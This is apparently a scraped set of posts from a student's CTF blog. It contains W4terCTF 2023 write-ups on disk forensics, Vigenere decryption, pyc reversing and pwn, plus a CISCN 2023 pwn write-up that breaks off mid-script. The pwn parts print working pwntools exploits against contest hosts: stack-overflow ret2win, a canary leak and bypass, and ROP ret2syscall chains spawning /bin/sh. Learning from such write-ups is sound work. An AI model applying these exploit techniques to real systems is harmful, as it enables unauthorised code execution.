calc.py //输出：Well done! The password for flag.7z is [/*一串超级长的数字*/] 做题时的截图：（不得不说Fedora还是挺好看的） calc.py的代码：\n# Use this script to calculate the hash of the ./data folder # The result can be used to excrypt the flag.7z file import hashlib import os def hashfile(hasher_func, path, blocksize = 65536): afile = open(path, \u0026#39;rb\u0026#39;) hasher = hasher_func() buf = afile.read(blocksize) while len(buf) \u0026gt; 0: hasher.update(buf) buf = afile.read(blocksize) afile.close() return hasher.hexdigest().encode() def hashdir(hasher_func, path, blocksize = 65536): hasher = hasher_func() for root, dirs, files in os.walk(path): for name in files: print(os.path.join(root, name)) hasher.update(os.path.join(root, name).encode()) hasher.update(hashfile(hasher_func, os.path.join(root, name), blocksize)) for _dir in dirs: hasher.update(hashdir(hasher_func, os.path.join(root, _dir), blocksize)) return hasher.hexdigest().encode() if __name__ == \u0026#39;__main__\u0026#39;: pre_hash = hashdir(hashlib.md5, \u0026#39;./data\u0026#39;) if pre_hash != b\u0026#39;da206f2407171ed2ea0779a1e93af014\u0026#39;: print(\u0026#39;Something is wrong, please check your volume!\u0026#39;) exit(1) hash_pwd = hashdir(hashlib.sha256, \u0026#39;./data\u0026#39;) print(f\u0026#34;Well done! The password for flag.7z is [{hash_pwd.decode()}]\u0026#34;) the end # 完成这道题前前后后大概跨越了三天，第一步判断磁盘顺序全靠有师傅们的题解，引领我从零开始学习RAID相关知识，第二步与第三步着实让我认认真真地熟悉了一遍linux系统的各种操作，还学习了一下btrfs的相关知识（其实在第三步的方法一中为了解决报错都把btrfs的官方文件看了好几遍了 😇 ）\n一道题完整地解决再认真地写一下wp，实实在在地学到了许多东西。在次，也让我对我在ctf路上最好的朋友——搜索引擎 表达一下我深深的感谢！ 还有一个小彩蛋，我在做题时参考了一下GZ学长的wp： https://blog.gztime.cc/posts/2021/b76fbea6/#%E9%98%B5%E5%88%97%E6%81%A2%E5%A4%8D%E5%A4%A7%E5%B8%88 以后一定~~（翻一翻)~~好好读一读学长的blog。\n最后： 感谢您的阅读！这是我在ctf路上写的第一份完整wp，有任何不足之处还请批评指正！ 离开前再复习一下这一篇wp的主要内容吧 ! see you next time ! ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_w4ter/11_w4ter-disk_write_up/","section":"Posts","summary":"本题wp的结构如下：（前排提示，该题wp有点多） 题目描述 # ​","title":"misc-W4ter Disk"},{"content":"先在浏览器上访问实例，可以得到密文：\nOkze WEYng,\nD eixy jgty lrmdtpt afhlm onf cdyf lgm icxn gik\u0026rsquo;qp kmwijbwv oey mrsheklrhe ho ROC wpubkptfrm. Ll hdp hhwq, sqjvsbactywt fm i whtnozy wzfydibhb iv lltx PNQ vqpgiyvaur, ltc vn\u0026rsquo;d bvejonihj sz nziy l zxdy rhlyhregmqcyz xu oey lcvepxdan pglgtmnqid spigacbnnh oeub uhd fydq.\nCy vupnpck whxazntlliqn, oey Dcwdykqr uyw Lpzpuz wyoskqf ucx ydkrfil sgzobrm. Ean Kddyvyhd noouyc bb p klfgubosgarntv bjwpnqnkstum pcaang oeub oidd g qrjptcxid emsmncj sb yyvrecbl xfqhyzdkn xxbhvdya. Cj\u0026rsquo;r l vnjycyda zkwzsfstum gize, kjo fn kud ap iqnwvxm jnfho zhdbadawj twpgvmqm. Jgp Izrmlk lxkeyz ci z dolcfpk bjwpnqnkstum pcaang oeub mxhqzr runa utoqyz cd ssk oyutgctsq vg u vhikc aoxung jc jwmystumf xzpw icb utjxzmks. Zioxac xosxnefcgous zyotmp gwlu zobzawpw ncxosxnyny zdpbybzjzp mcwx zd zgr Uoojcxbx Mhsqjvsviy Lcpiauzx (QDD). GDF cd t bnhjyblyb ptbesamrdi xfoihhenl gblm dhzp u syo sz kmpljic pia xmwhxaz cnnl. Bc\u0026rsquo;h ybmqaddo zn eydbbi vqniwar qxnz ygxw icb gwmj zobzawpw ldhmobyhr ltc vm hbmtgv oayt sz kmpljic hzkmqnyup jzgu. Llhbhbnzcs dyiqljebxc dp uvijgpx hzjzkcpiq yvwhxazhbh exlwifkcy jglz\u0026rsquo;r hmpw rc XQZ kbqkwkmtyd. Tbnhjyblyb ptbesamrdi rmmm jvz qdlm, l idqgfw syo zyj z cltojiz hyg, ne dyiqlje tws ybwzsfs ogsn. Ce\u0026rsquo;l ldhjivfo tdkc vh obpxoxf acwmlzteyd tws nbwclu bzslhhtvjidlh xleszinym.\nTg ldizfcmyny, iqljehpgvmbg ci z qgrpcytcxid uvx sglrkrhrbwv nrvryss enzg\u0026rsquo;m nkridzut ne BEL buuwencbbm. Ebusskq lif\u0026rsquo;kn czt nw WJE zx za yiingdbhkyt BELde, oywngnquvxymr zgr xtyotmbhb ydbceogczg ctxehqkkdd or rmdxwidxf bi itnidrx tg cwzpy kbqkwkmtyd. Dntk brxfeqttf nho ajkz cov whznqhaa eaxhz zcxbuqd!\nEnhl qejv dp Q4byhBEL ncyy uapxb ovLQU31 ftcrlwbwt Oe3 ovxuqwomr mPvaT7 pkxmlbhyk 8TECpW dcybltcdd 1Y amqycercz 1oyyO3DbJ ikbmp uapxb.\nVmmj qpmzexd, Wa. 0e\n可以看出来密文应该是用维吉尼亚密码来加密的，我们可以自己写脚本来解密，也可以直接用在线网站解密， python脚本参考： https://cloud.tencent.com/developer/article/1076719 在线网站： https://www.guballa.de/vigenere-solver 解码之后得到原文：\nDear CTFer,\nI hope this message finds you well and that you're enjoying the excitement of CTF challenges. As you know, cryptography is a crucial component of many CTF challenges, and it's important to have a good understanding of the different encryption techniques that are used. In classic cryptography, the Vigenere and Caesar ciphers are popular choices. The Vigenere cipher is a polyalphabetic substitution cipher that uses a repeating keyword to encipher plaintext messages. It's a powerful encryption tool, but it can be cracked using frequency analysis. The Caesar cipher is a simpler substitution cipher that shifts each letter in the plaintext by a fixed number of positions down the alphabet. Modern cryptography offers more advanced encryption techniques such as the Advanced Encryption Standard (AES). AES is a symmetric encryption algorithm that uses a key to encrypt and decrypt data. It's designed to resist attacks from even the most advanced computers and is widely used to encrypt sensitive data. Asymmetric encryption is another important encryption technique that's used in CTF challenges. Asymmetric encryption uses two keys, a public key and a private key, to encrypt and decrypt data. It's commonly used in digital signatures and secure communication protocols. In conclusion, cryptography is a fascinating and challenging subject that's critical to CTF challenges. Whether you're new to CTF or an experienced CTFer, understanding the different encryption techniques is essential to succeed in these challenges. Keep exploring and have fun cracking those ciphers! Your flag is W4terCTF open brace unRAV31 underline Th3 underline sEcrE7 underline 8URIeD underline 1N underline 1reqU3NcY close brace. Best regards, Dr. 0p\nflag即为：\n最后一段： W4terCTF open brace unRAV31 underline Th3 underline sEcrE7 underline 8URIeD underline 1N underline 1reqU3NcY close brace\n翻译一下： W4terCTF开大括号unRAV31下划线Th3下划线sEcrE7下划线8URIeD下划线1N下划线1reqU3NcY结束大括号。\n得到： W4terCTF{unRAV31_Th3_sEcrE7_8URIeD_1N_1reqU3NcY}\n网站更新： https://www.boxentriq.com/code-breaking/cipher-identifier https://www.boxentriq.com/code-breaking/vigenere-cipher https://ctf.bugku.com/tools 可以先用第一个网站查看最有可能利用的加密方法，再用第二个网站爆破密钥，第二、三个网站可以用来解密全文\n","date":"July 5, 2023","permalink":"/posts/wp/2023_04_w4ter/7_weird-letter_write_up/","section":"Posts","summary":"先在浏览器上访问实例，可以得到密文： Okze WEYng, D eixy jgty lrmdtpt afhlm onf cdyf lgm icxn gik\u0026rsquo;qp","title":"misc-Weird Letter"},{"content":" 栈溢出利用的基本步骤 # 1.将程序拖入IDA中查看反汇编代码 # （也可以自己先利用题目给出的C语言源码搞清楚程序逻辑后再IDA分析） 可以看到当我们的游戏win时会让我们输入名字，且s字符串的大小只有16， 2.用鼠标点击变量s，可以查看vulnerable函数的栈， # 可以看到 s 的大小为0x14 - 0x4 = 0x10 = 16 s 离返回地址的距离为0x14 - 0x0 = 20 由32位栈调用的原理可知在跳到返回地址前函数栈还会pop ebp寄存器， 所以我们的填充数据段大小为20+4=24，\n3.最后找到我们要跳转到后门函数（或者是可以get shell）的地址 # 可以看到在地址为 0x08049236 的汇编代码是success函数的开始，所以我们的跳转的返回地址可以为 0x08049236 这里的返回地址还可以写0x08049242之前的其他地址： 0x08049237、0x08049239、0x0804923A、0x0804923D 但是0x08049242及之后的地址就不行了，因为转到这些地址时函数的get shell 指令就不能完整地执行 发送地址时我们用p32()来进行32位的小端打包字节并发送\nexp如下： # from pwn import* context(arch = \u0026#34;amd64\u0026#34;, os= \u0026#39;linux\u0026#39;) context.log_level = \u0026#39;debug\u0026#39; taolve = remote(\u0026#39;ctf.w4terdr0p.team\u0026#39;, 26539) #taolve = process(\u0026#39;./0\u0026#39;) \u0026#39;\u0026#39;\u0026#39; 填充字符 \u0026#39;\u0026#39;\u0026#39; offset = 24 #填充字符的长度 ret_adrr=0x08049236 payload = b\u0026#39;a\u0026#39;*offset + p32(ret_adrr) #我们要修改为的返回地址 taolve.recvuntil(b\u0026#39;Please give me a position(0-8):\u0026#39;) taolve.sendline(b\u0026#39;1\u0026#39;) taolve.recvuntil(b\u0026#39;Please give me a position(0-8):\u0026#39;) taolve.sendline(b\u0026#39;1\u0026#39;) #填一个不合理的数字让电脑帮我们下棋（） #实际执行时发现我们随便填一个数字其实最后都是有可能win的，一次没win就两次（） taolve.recvuntil(b\u0026#39;Please give me a position(0-8):\u0026#39;) taolve.sendline(b\u0026#39;1\u0026#39;) taolve.recvuntil(b\u0026#39;Tell me your name:\\n\u0026#39;) taolve.sendline(payload) taolve.interactive() #最后转到交互模式后还需要使用linux命令行来得到flag #ls 指令来查看当前目录下有哪些文件和文件夹 #cat flag 来打印 flag \u0026#39;\u0026#39;\u0026#39; 如果出现下面这句话： [*] Got EOF while reading in interactive 则说明可能之前的栈溢出填充字符的长度计算错误， 或者是我们所填写的返回地址有错误， 比如未完成之前的必要汇编指令就强行执行一些指令 \u0026#39;\u0026#39;\u0026#39; ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_w4ter/2_tic-tac-toe-level-0_write_up/","section":"Posts","summary":"栈溢出利用的基本步骤 # 1.将程序拖入IDA中查看反汇编代码 #","title":"PWN-Level 0 Tic-Tac-Toe "},{"content":"由canary的结构我们可以得知当我们输入的填充字符覆盖掉canary的最后一位/00字符时就能利用输出函数将canary的值打印出来，知道canary的值后我们就能绕过Canary保护进行栈溢出\nexp:\n# encoding: utf-8 from pwn import* #context(arch = \u0026#34;amd64\u0026#34;, os= \u0026#39;linux\u0026#39;) context.log_level = \u0026#39;debug\u0026#39; taolve = remote(\u0026#39;ctf.w4terdr0p.team\u0026#39;, 39302) #taolve = process(\u0026#39;./1\u0026#39;) \u0026#39;\u0026#39;\u0026#39; 填充字符 \u0026#39;\u0026#39;\u0026#39; offset = 40 ret_adrr = 0x4013DB taolve.recvuntil(b\u0026#39;How many tokens would you like to take?: \u0026#39;) taolve.send(b\u0026#39;a\u0026#39;*40+b\u0026#39;d\u0026#39;) taolve.recvuntil(b\u0026#39;ad\u0026#39;) canary = u64(b\u0026#39;\\x00\u0026#39; + taolve.recv(7)) print(hex(canary)) payload = b\u0026#39;a\u0026#39;*40 + p64(canary) + p64(0) + p64(ret_adrr) taolve.recvuntil(b\u0026#39;How many tokens would you like to take?: \u0026#39;) taolve.send(payload) taolve.interactive() ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_w4ter/3_nimgame-level-1_write_up/","section":"Posts","summary":"由canary的结构我们可以得知当我们输入的填充字符覆盖掉c","title":"PWN-Level 1 Nimgame"},{"content":"1.给出的实例入口为 host:port，则可以使用 nc host port 来连接到对应的实例 需要在linux虚拟机 / macos 中安装nc ，在Windows上也可以安装nc （不过要设置好环境变量，可能系统还会报毒） 2.用python的pwntools库来远程连接实例入口\nfrom pwn import* context.log_level = \u0026#39;debug\u0026#39; taolve = remote(\u0026#34;ctf.w4terdr0p.team\u0026#34;, 45423) taolve.interactive() ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_w4ter/1_what-is-netcat_write_up/","section":"Posts","summary":"1.给出的实例入口为 host:port，则可以使用 nc host port 来连","title":"PWN-What is NetCat"},{"content":"","date":"July 5, 2023","permalink":"/tags/pwntool/","section":"Tags","summary":"","title":"pwntool"},{"content":"","date":"July 5, 2023","permalink":"/tags/pyc%E9%80%86%E5%90%91/","section":"Tags","summary":"","title":"pyc逆向"},{"content":"","date":"July 5, 2023","permalink":"/tags/reverse/","section":"Tags","summary":"","title":"reverse"},{"content":"直接将程序拖入IDA，shift+F12查看字符串，即可看到 flag ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_w4ter/4_lazy-puts_write_up/","section":"Posts","summary":"直接将程序拖入IDA，shift+F12查看字符串，即可看到","title":"reverse-Lazy Puts"},{"content":"下载题目附件后发现是pyc程序，所以我们先将pyc程序用在线网站反编译为python代码， pyc文件反编译在线网站： https://www.lddgo.net/string/pyc-compile-decompile 反编译后的代码：\n# uncompyle6 version 3.9.0 # Python bytecode version base 3.8.0 (3413) # Decompiled from: Python 3.6.12 (default, Feb 9 2021, 09:19:15) # [GCC 8.3.0] # Embedded file name: code.py # Compiled at: 2023-04-07 02:35:04 # Size of source mod 2**32: 2203 bytes import random nums = [ 1978258991135969430907740146613972524912040387261480714498605437001413714048012005658525477720873, 1414825718139831310004497635022196603261545889510259032286492681850346322299057448961219349615261, 1471197358920577704193422061749330372697192144784994772676793648983411513291005358932035022769990, 1095683197289929480686106401204396721653343660344305230304481285071676149806630337393361064473668, 921996790539554852662428059590451844400982285998027884584784172033455291195472563692294712472587, 768317485525512263520758851945293018259735364080330793974615632236110541795950958118326437487430, 544753920998122166512884082722895849761507576602028192924568306511924098132295226512319060641414, 87332110670036340709881571180530351791609485922184989048968644870753368056574249836210523509408, 1814118338382323693695027271435064617570300757148890716598838416084005431401276422453072948468217, 173167855524690381585242463414043296161603028899449630118125665233261307593525601052121277962903, 1328135371287398682018843879095667300066820442500694217856944376268862978878503400394942612696705, 4117570442808647688572679335481780771481111770146336113621471687653134742713621695560054296991, 1082796078933455613148302349648071297360971195093615794573975199793058617865979195384327642949519, 173826967948894750523527810600302472460382287952334480452515236484202394368569860647033480131050, 1926148526062731853158569840732303453811005817255836633583274407431574365300550129320730364526148, 576041746074522799631445170591885928961808907043509779947155037770053968111847260719001641989712, 298331994482251759036663482326665150166062610449547071972614876214926600675927398653925319016398, 1052527421677696645993193213526505700609834956685120728698363944650278933100105702857853287655234] if __name__ == \u0026#39;__main__\u0026#39;: flag = input(\u0026#39;Input your flag: \u0026#39;).strip().encode() num = int.from_bytes(flag, \u0026#39;big\u0026#39;) print(num) #flag1 = int(flag.decode()) flag1 = num.to_bytes( 128,\u0026#39;big\u0026#39;,signed = True) print(flag1) random.seed(num) for i in random.choices(nums, k=5): num ^= i else: if num == 3777974786954196899113426690262802545626191500785179338842593781943714596052295548581660967940571319476154736949371450126516159039: print(\u0026#39;Correct!\u0026#39;) else: print(\u0026#39;Wrong!\u0026#39;) 直接遍历所有的情况，跑一遍代码，再用正则表达式搜索符合条件的flag\nnums = [ 1978258991135969430907740146613972524912040387261480714498605437001413714048012005658525477720873, 1414825718139831310004497635022196603261545889510259032286492681850346322299057448961219349615261, 1471197358920577704193422061749330372697192144784994772676793648983411513291005358932035022769990, 1095683197289929480686106401204396721653343660344305230304481285071676149806630337393361064473668, 921996790539554852662428059590451844400982285998027884584784172033455291195472563692294712472587, 768317485525512263520758851945293018259735364080330793974615632236110541795950958118326437487430, 544753920998122166512884082722895849761507576602028192924568306511924098132295226512319060641414, 87332110670036340709881571180530351791609485922184989048968644870753368056574249836210523509408, 1814118338382323693695027271435064617570300757148890716598838416084005431401276422453072948468217, 173167855524690381585242463414043296161603028899449630118125665233261307593525601052121277962903, 1328135371287398682018843879095667300066820442500694217856944376268862978878503400394942612696705, 4117570442808647688572679335481780771481111770146336113621471687653134742713621695560054296991, 1082796078933455613148302349648071297360971195093615794573975199793058617865979195384327642949519, 173826967948894750523527810600302472460382287952334480452515236484202394368569860647033480131050, 1926148526062731853158569840732303453811005817255836633583274407431574365300550129320730364526148, 576041746074522799631445170591885928961808907043509779947155037770053968111847260719001641989712, 298331994482251759036663482326665150166062610449547071972614876214926600675927398653925319016398, 1052527421677696645993193213526505700609834956685120728698363944650278933100105702857853287655234] if __name__ == \u0026#39;__main__\u0026#39;: #flag = input(\u0026#39;Input your flag: \u0026#39;).strip().encode() #num = int.from_bytes(flag, \u0026#39;big\u0026#39;) num = 3777974786954196899113426690262802545626191500785179338842593781943714596052295548581660967940571319476154736949371450126516159039; for a1 in range(18): for a2 in range (18): for a3 in range(18): for a4 in range(18): for a5 in range(18): num ^= nums[a1] num ^= nums[a2] num ^= nums[a3] num ^= nums[a4] num ^= nums[a5] flag1 = int.to_bytes(num, 54,\u0026#39;big\u0026#39;,signed = True) #if(flag1[0]==\u0026#39;W\u0026#39;): print(flag1) *小技巧：可以在Ubuntu虚拟机上先输入命令：\nscript -f log.txt #script工具，可以记录shell终端的内容到文件中 然后再运行代码，得到一个245MB的txt文件（有亿点点大） 直接在虚拟机终端或是记事本进行正则表达式匹配都可能会使进程卡死， 所以将该txt文件拖入地表较强的编辑器010editor中，在正则表达式匹配， 得到flag\n","date":"July 5, 2023","permalink":"/posts/wp/2023_04_w4ter/5_oh-my-python_write_up/","section":"Posts","summary":"下载题目附件后发现是pyc程序，所以我们先将pyc程序用在线","title":"reverse-Oh My Python"},{"content":"","date":"July 5, 2023","permalink":"/tags/rsa/","section":"Tags","summary":"","title":"RSA"},{"content":"","date":"July 5, 2023","permalink":"/series/w4terctf2023-wp/","section":"Series","summary":"","title":"W4terCTF2023 wp"},{"content":"","date":"July 5, 2023","permalink":"/tags/%E7%A3%81%E7%9B%98%E5%8F%96%E8%AF%81/","section":"Tags","summary":"","title":"磁盘取证"},{"content":"","date":"July 5, 2023","permalink":"/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6/","section":"Tags","summary":"","title":"古典密码学"},{"content":"","date":"July 5, 2023","permalink":"/tags/%E6%B5%81%E9%87%8F%E5%8F%96%E8%AF%81/","section":"Tags","summary":"","title":"流量取证"},{"content":"","date":"July 5, 2023","permalink":"/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/","section":"Tags","summary":"","title":"栈溢出"},{"content":"Believe it or not , this is just a test .\nAnd I will never tell you the password is PASSWORD\n文章的部分内容被密码保护：\n--- DON'T MODIFY THIS LINE ---\rYou cannot see me unless you\u0026rsquo;ve got the password! # ","date":"July 4, 2023","permalink":"/posts/wp/2023_04_w4ter/111/","section":"Posts","summary":"\u003cp\u003eBelieve it or not , \u003cstrong\u003ethis is just a test\u003c/strong\u003e .\u003c/p\u003e","title":"An Encrypted Post"},{"content":"Hi！你好呀！\n欢迎来到我的博客小站！\n这里是 ta0lve , 一名普通的在校大学生。\r博客整改中，暂时把文章都清空了\u0026hellip;\n咕咕咕\n关于我 # SYSU W4terDr0p 战队成员， S1uM4i 战队成员，pwn新手，还在学习的征途中 网安专业在读大二，二进制安全爱好者 大一时与舍友一起打CTF，在小队里负责 pwn \u0026amp; reverse \u0026amp; Crypto ，也会打一打misc 目前正在学习 IoT 和 IoV 安全，也在一步步地尝试 Kernel Pwn 不午休星人，常年中午不回宿舍，随机出现在实验室、教学楼、图书馆，晚上8点还可能出现在四百米跑道上 乐于尝试各种各样的知识，包括但不限于 信息安全，后端开发，机器学习，数学建模，动物学，宏观生物学 等等 喜欢中土世界，三刷《魔戒》，高中时连续几天读完《精灵宝钻》 国际象棋、四国军棋、中国象棋爱好者 半个二次元，n刷《冰菓》、《你的名字》、《声之形》，为了看《罗小黑》和《风灵玉秀》加入了长生宗天天泡枸杞 希望新的一年能够少熬夜、多锻炼，有一个健康的作息 关于博客 # 此博客搭建于2023年7月2日，希望能够在这个blog里记录自己的学习过程与思考，希望自己能和这个blog一起成长\n本博客分为以下几个部分（可以看看博客的右上角）\nPosts：所有博客文章都在此归档，少部分文章有加密（前端可能有点简陋，不过应该不碍事吧😴） 分类 Categories：一些大的方向上的文章分类，如CTF笔记、WP、编程语言的学习、生活记录等 标签 Tags：通过某些关键词来寻找相关的文章，如查看与pwn、reverse、栈溢出这些相关的文章 友链 link：一些优秀师傅、朋友的博客链接，方便大家去围观大佬博客 About：即本页面，简单介绍一下自己与这个博客 搜索框：可以搜索本博客的文章内容（位于博客界面的右上角） 小太阳/月亮标志：点击转换白天和黑夜模式（位于博客界面的右上角） 本博客所有文章均采用 「署名-非商业性使用-相同方式共享 4.0 国际」许可协议进行许可。如有转载、二次创作，及想用于其他目的，欢迎联系我获取授权。\n若只是引用学习记录中的内容且是非盈利目的的使用，只需要在文章内附带原文链接即可。\n网站大多插图均来自网络，侵删致歉\n","date":"July 2, 2023","permalink":"/about/","section":"","summary":"Hi！你好呀！ 欢迎来到我的博客小站！ 这里是 ta0lve , 一名普通的在校","title":"About"},{"content":"Walking on the Time Axis.\n","date":"July 2, 2023","permalink":"/link/gztime/","section":"友链/links","summary":"\u003cp\u003e\u003cstrong\u003eWalking on the Time Axis.\u003c/strong\u003e\u003c/p\u003e","title":"GZTime"},{"content":"REACH FOR THE STARS\n","date":"July 1, 2023","permalink":"/link/tel/","section":"友链/links","summary":"\u003cp\u003eREACH FOR THE STARS\u003c/p\u003e","title":"TEL"},{"content":"以下为2023信安国赛初赛的pwn，reverse和Crypto的部分题\npwn-烧烤摊儿 # 解法一 # 构造rop链 ret2syscall\nfrom pwn import * is_debug = 1 is_remote = 1 if is_debug: context.log_level = \u0026#39;debug\u0026#39; if is_remote == 1: taolve = remote(\u0026#34;123.56.135.185\u0026#34;, 31924) else: taolve = process(\u0026#39;./pwn\u0026#39;) taolve.recvuntil(b\u0026#34;\u0026gt;\u0026#34;) taolve.sendline(b\u0026#34;1\u0026#34;) taolve.recv() taolve.sendline(b\u0026#34;1\u0026#34;) taolve.recvuntil(b\u0026#34;\\n\u0026#34;) # 通过负数来增加自己的钱的数量，使得之后有足够的钱来承包烧烤摊 taolve.sendline(b\u0026#34;-100000\u0026#34;) taolve.recvuntil(b\u0026#34;\u0026gt;\u0026#34;) taolve.sendline(b\u0026#34;4\u0026#34;) taolve.recvuntil(b\u0026#34;\u0026gt;\u0026#34;) taolve.sendline(b\u0026#34;5\u0026#34;) # 一些可能会用到的rop的地址 # 使用 ROPgadget 工具 pop_rdi_ret = 0x040264f pop_rdi = 0x040264f pop_rsi = 0x0040a67e pop_rdx_rbx = 0x04a404b pop_rax = 0x00458827 ret = 0x040101a # 我们填写的name的地址，可以直接在ida上得到 name = 0x04E60F0 # 将/bin/sh字符串写到name的地址 payload = b\u0026#34;/bin/sh\\x00\u0026#34; + b\u0026#34;a\u0026#34; * 31 + b\u0026#34;d\u0026#34; # 构造syscall ROP链（经典的ret2syscall解法） payload += p64(ret) + p64(pop_rax) + p64(0x3b) payload += p64(pop_rdx_rbx) + p64(0x0) + p64(1) + p64(pop_rdi) + p64(name) payload += p64(pop_rsi) + p64(0x0) + p64(0x45A066) taolve.recvuntil(b\u0026#34;\\n\u0026#34;) taolve.sendline(payload) taolve.interactive() 解法二 # 也可以直接利用ROPgadget自动生成ropchain\nROPgadget --binary pwn --ropchain exp如下：\nfrom pwn import * from struct import pack is_debug = 1 is_remote = 1 if is_debug: context.log_level = \u0026#39;debug\u0026#39; if is_remote == 1: taolve = remote(\u0026#34;123.56.135.185\u0026#34;, 31924) else: taolve = process(\u0026#39;./pwn\u0026#39;) taolve.recvuntil(b\u0026#34;\u0026gt;\u0026#34;) taolve.sendline(b\u0026#34;1\u0026#34;) taolve.recv() taolve.sendline(b\u0026#34;1\u0026#34;) taolve.recvuntil(b\u0026#34;\\n\u0026#34;) # 通过负数来增加自己的钱的数量，使得之后有足够的钱来承包烧烤摊 taolve.sendline(b\u0026#34;-100000\u0026#34;) taolve.recvuntil(b\u0026#34;\u0026gt;\u0026#34;) taolve.sendline(b\u0026#34;4\u0026#34;) taolve.recvuntil(b\u0026#34;\u0026gt;\u0026#34;) taolve.sendline(b\u0026#34;5\u0026#34;) offset = 40 p = b\u0026#39;a\u0026#39; * offset p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x000000000040a67e) # pop rsi ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x00000000004e60e0) # @ .data p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000458827) # pop rax ; ret p += b\u0026#39;/bin//sh\u0026#39; p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x000000000045af95) # mov qword ptr [rsi], rax ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x000000000040a67e) # pop rsi ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x00000000004e60e8) # @ .data + 8 p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000447339) # xor rax, rax ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x000000000045af95) # mov qword ptr [rsi], rax ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x000000000040264f) # pop rdi ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x00000000004e60e0) # @ .data p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x000000000040a67e) # pop rsi ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x00000000004e60e8) # @ .data + 8 p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x00000000004a404b) # pop rdx ; pop rbx ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x00000000004e60e8) # @ .data + 8 p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x4141414141414141) # padding p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000447339) # xor rax, rax ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; ret p += pack(\u0026#39;\u0026lt;Q\u0026#39;, 0x0000000000496710) # add rax, 1 ; 